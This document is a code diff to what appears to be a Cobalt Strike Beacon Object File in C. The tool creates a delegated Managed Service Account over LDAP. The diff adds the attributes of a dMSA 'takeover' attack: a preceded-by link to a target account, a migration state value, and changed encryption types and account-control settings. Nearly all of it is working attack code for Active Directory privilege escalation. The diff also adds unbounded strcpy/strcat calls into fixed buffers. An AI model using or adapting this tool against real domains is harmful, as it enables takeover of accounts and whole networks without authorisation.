@@ -7,6 +7,7 @@
 
 #pragma comment(lib, "wldap32.lib")
 
+// LDAP imports
 WINLDAPAPI LDAP* LDAPAPI WLDAP32$ldap_init(PSTR HostName, ULONG PortNumber);
 WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_set_option(LDAP *ld, int option, void *invalue);
 WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_bind_s(LDAP *ld, PSTR dn, PSTR cred, ULONG method);
@@ -15,28 +16,31 @@ WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_modify_s(LDAP *ld, PSTR dn, LDAPModA *mods
 WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_unbind(LDAP *ld);
 WINLDAPAPI PSTR LDAPAPI WLDAP32$ldap_err2string(ULONG err);
 
-DECLSPEC_IMPORT int MSVCRT$snprintf(char *buffer, size_t count, const char *format, ...);
-DECLSPEC_IMPORT void* MSVCRT$malloc(size_t size);
-DECLSPEC_IMPORT void MSVCRT$free(void *ptr);
-DECLSPEC_IMPORT size_t MSVCRT$strlen(const char *str);
+
+DECLSPEC_IMPORT char *MSVCRT$strcpy(char *dst, const char *src);
+DECLSPEC_IMPORT char *MSVCRT$strcat(char *dst, const char *src);
+
+// ---------------------------------------------------------------------------
+// Entry point
+// ---------------------------------------------------------------------------
 
 void go(char *args, int len) {
     datap parser;
     BeaconDataParse(&parser, args, len);
 
-    char *path = BeaconDataExtract(&parser, NULL);
+    char *path     = BeaconDataExtract(&parser, NULL);
     char *dMSAname = BeaconDataExtract(&parser, NULL);
-    char *access = BeaconDataExtract(&parser, NULL);
-    char *target = BeaconDataExtract(&parser, NULL);
-    char *domain = BeaconDataExtract(&parser, NULL);
+    char *access   = BeaconDataExtract(&parser, NULL);
+    char *target   = BeaconDataExtract(&parser, NULL);
+    char *domain   = BeaconDataExtract(&parser, NULL);
 
     LDAP *ld = NULL;
     int result;
     int version = LDAP_VERSION3;
-    unsigned char *binary_data = NULL;
-    int binary_len = 0;
 
-    BeaconPrintf(CALLBACK_OUTPUT, "Connecting to LDAP\n");
+    ULONG rc;
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Connecting to LDAP\n");
     ld = WLDAP32$ldap_init(domain, LDAP_PORT);
     if (ld == NULL) {
         BeaconPrintf(CALLBACK_ERROR, "LDAP init failed\n");
@@ -55,51 +59,90 @@ void go(char *args, int len) {
         goto cleanup;
     }
 
-    // Compose DN and attributes
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Connected to LDAP successfully\n");
+
+    // Buffers
     char childDn[512];
     char dnsHostName[512];
     char samAccountName[512];
 
-    snprintf(childDn, sizeof(childDn), "CN=%s,%s", dMSAname, path);
-    snprintf(dnsHostName, sizeof(dnsHostName), "%s.%s", dMSAname, domain);
-    snprintf(samAccountName, sizeof(samAccountName), "%s$", dMSAname);
+    
+    // childDn = "CN=" + dMSAname + "," + path
+    MSVCRT$strcpy(childDn, "CN=");
+    MSVCRT$strcat(childDn, dMSAname);
+    MSVCRT$strcat(childDn, ",");
+    MSVCRT$strcat(childDn, path);
 
-    // Set up attributes
-    LDAPModA modObjectClass, modMSAState, modInterval, modDns, modSam;
-    LDAPModA *mods[6];
+    // dnsHostName = dMSAname + "." + domain
+    MSVCRT$strcpy(dnsHostName, dMSAname);
+    MSVCRT$strcat(dnsHostName, ".");
+    MSVCRT$strcat(dnsHostName, domain);
+
+    // samAccountName = dMSAname + "$"
+    MSVCRT$strcpy(samAccountName, dMSAname);
+    MSVCRT$strcat(samAccountName, "$");
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] dMSA DN: %s\n", childDn);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] dNSHostName: %s\n", dnsHostName);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] sAMAccountName: %s\n", samAccountName);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Target object for takeover: %s\n", target);
+
+    
+    // If you want to add the LDAP entry, uncomment and use:
+    LDAPModA modObjectClass, modMSAState, modInterval, modDns, modSam, linkAttr, encAttr, uacAttr, state2Attr;
+    LDAPModA *mods[9];
 
     char *objectClassVals[] = { "msDS-DelegatedManagedServiceAccount", NULL };
-    char *msaStateVals[] = { "0", NULL };
-    char *intervalVals[] = { "30", NULL };
-    char *dnsVals[] = { dnsHostName, NULL };
-    char *samVals[] = { samAccountName, NULL };
+    char *msaStateVals[]    = { "2", NULL };
+    char *intervalVals[]    = { "30", NULL };
+    char *dnsVals[]         = { dnsHostName, NULL };
+    char *samVals[]         = { samAccountName, NULL };
+    char *linkVals[] = { target, NULL };
+    char *encVals[]  = { "28", NULL };   // 0x1c
+    char *uacVals[]  = { "4096", NULL }; // 0x1000
 
-    modObjectClass.mod_op = LDAP_MOD_ADD;
-    modObjectClass.mod_type = "objectClass";
+    modObjectClass.mod_op     = LDAP_MOD_ADD;
+    modObjectClass.mod_type   = "objectClass";
     modObjectClass.mod_values = objectClassVals;
 
-    modMSAState.mod_op = LDAP_MOD_ADD;
-    modMSAState.mod_type = "msDS-DelegatedMSAState";
+    modMSAState.mod_op     = LDAP_MOD_ADD;
+    modMSAState.mod_type   = "msDS-DelegatedMSAState";
     modMSAState.mod_values = msaStateVals;
 
-    modInterval.mod_op = LDAP_MOD_ADD;
-    modInterval.mod_type = "msDS-ManagedPasswordInterval";
+    modInterval.mod_op     = LDAP_MOD_ADD;
+    modInterval.mod_type   = "msDS-ManagedPasswordInterval";
     modInterval.mod_values = intervalVals;
 
-    modDns.mod_op = LDAP_MOD_ADD;
-    modDns.mod_type = "dNSHostName";
+    modDns.mod_op     = LDAP_MOD_ADD;
+    modDns.mod_type   = "dNSHostName";
     modDns.mod_values = dnsVals;
 
-    modSam.mod_op = LDAP_MOD_ADD;
-    modSam.mod_type = "sAMAccountName";
+    modSam.mod_op     = LDAP_MOD_ADD;
+    modSam.mod_type   = "sAMAccountName";
     modSam.mod_values = samVals;
+
+    linkAttr.mod_op     = LDAP_MOD_ADD;
+    linkAttr.mod_type   = "msDS-ManagedAccountPrecededByLink";
+    linkAttr.mod_values = linkVals;
+
+    encAttr.mod_op     = LDAP_MOD_REPLACE;
+    encAttr.mod_type   = "msDS-SupportedEncryptionTypes";
+    encAttr.mod_values = encVals;
+
+    uacAttr.mod_op     = LDAP_MOD_REPLACE;
+    uacAttr.mod_type   = "userAccountControl";
+    uacAttr.mod_values = uacVals;
 
     mods[0] = &modObjectClass;
     mods[1] = &modMSAState;
     mods[2] = &modInterval;
     mods[3] = &modDns;
     mods[4] = &modSam;
-    mods[5] = NULL;
+    
+    mods[5] = &linkAttr;
+    mods[6] = &encAttr;
+    mods[7] = &uacAttr;
+    mods[8] = NULL;
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting to add object: %s\n", childDn);
 
@@ -109,6 +152,7 @@ void go(char *args, int len) {
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added service account: %s\n", dMSAname);
     }
+
 
 cleanup:
     if (ld != NULL) {
